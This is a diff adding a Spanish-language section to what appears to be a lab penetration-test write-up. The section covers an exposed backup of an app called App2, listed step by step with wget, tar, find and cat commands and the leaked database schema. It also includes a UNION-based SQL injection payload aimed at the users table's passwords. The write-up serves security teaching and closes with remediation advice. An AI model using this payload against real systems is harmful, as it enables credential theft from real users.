@@ -183,3 +183,111 @@ Esta fase representa tanto la identificación como la explotación efectiva de u
 
 > [!IMPORTANT]  
 > Solo APP1
+
+
+
+
+> [!IMPORTANT]
+> Para APP2
+
+
+# Vulnerabilidad 2: Exposición Pública del Esquema de Base de Datos de App2
+
+## Descripción
+
+Al igual que con App1, el servidor web en el puerto 9001 expone archivos de respaldo de la aplicación App2, en este caso el archivo `backup_app2.tar.gz`. Al descargarlo y analizar su contenido, descubrimos que contiene un archivo SQL (`database.sql`) que define la estructura completa de la base de datos de la aplicación.
+
+Este archivo revela:
+
+- La existencia de dos tablas: `users` y `books`.
+- El esquema detallado de cada tabla, incluyendo tipos de datos, claves primarias y foráneas.
+- Nombres exactos de columnas, como `email`, `passwd`, `user_id`, etc.
+
+### ¿Por qué es una vulnerabilidad?
+
+Este tipo de exposición no debería ocurrir en ningún entorno de producción. Provee a un atacante con inteligencia táctica precisa sobre el modelo de datos, lo que facilita enormemente la ejecución de ataques como:
+
+- **Inyección SQL (SQLi):** Saber exactamente cómo se llaman las tablas y columnas permite construir payloads de inyección eficaces sin necesidad de técnicas de enumeración lentas o ruidosas.
+- **Ataques dirigidos:** Saber que la columna de contraseñas se llama `passwd` (en lugar de `password`, `pwd`, etc.) reduce la incertidumbre del atacante.
+- **Comprensión del modelo de negocio:** Revela relaciones entre entidades (por ejemplo, que un libro pertenece a un usuario), lo que ayuda a planificar ataques más sofisticados.
+
+## Explotación Paso a Paso
+
+### 1. Descarga del archivo de respaldo
+
+```bash
+wget http://192.168.88.131:9001/backup_app2.tar.gz
+```
+
+**¿Por qué?**  
+El servidor SimpleHTTPServer en el puerto 9001 permite listar y descargar archivos sin autenticación. Esto es un error grave de configuración.
+
+### 2. Extracción del archivo
+
+```bash
+tar -xzf backup_app2.tar.gz
+```
+
+**¿Por qué?**  
+El archivo está comprimido en formato `.tar.gz`, común en entornos Linux para distribuir copias de seguridad.
+
+### 3. Localización del esquema de la base de datos
+
+```bash
+find . -name "database.sql"
+```
+
+Resultado:
+
+```
+./var/www/html/app2/database.sql
+```
+
+### 4. Análisis del esquema
+
+```bash
+cat ./var/www/html/app2/database.sql
+```
+
+Salida relevante:
+
+```sql
+CREATE TABLE users (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    username VARCHAR(50) NOT NULL UNIQUE,
+    email VARCHAR(100) NOT NULL UNIQUE,
+    passwd VARCHAR(255) NOT NULL
+);
+
+CREATE TABLE books (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    title VARCHAR(200) NOT NULL,
+    author VARCHAR(100) NOT NULL,
+    user_id INT,
+    FOREIGN KEY (user_id) REFERENCES users(id)
+);
+```
+
+**¿Por qué es útil para un atacante?**  
+Ahora sabe que puede intentar un ataque de inyección SQL en cualquier punto de entrada de App2 (por ejemplo, en un campo de login o búsqueda) usando consultas como:
+
+```sql
+' UNION SELECT id, username, email, passwd FROM users--
+```
+
+sin tener que adivinar nombres de tablas o columnas.
+
+## Impacto
+
+- **Gravedad:** Alta/Crítica.
+- **Vector:** Configuración insegura del servidor (exposición de archivos sensibles).
+- **Requisitos para explotar:** Solo acceso de red al puerto 9001.
+- **Consecuencias:** Facilita la explotación de otras vulnerabilidades (como SQLi) y reduce drásticamente el tiempo y ruido de un ataque real.
+
+## Recomendaciones
+
+1. Nunca exponer archivos de respaldo en servidores accesibles públicamente.
+2. Usar sistemas de control de versiones privados para gestionar el código fuente y los esquemas de base de datos.
+3. Auditar regularmente los servicios expuestos para detectar contenido sensible.
+4. Restringir el listado de directorios en servidores web (en Apache/Nginx, evita `Options Indexes`; en Python SimpleHTTPServer, no lo uses en producción).
+
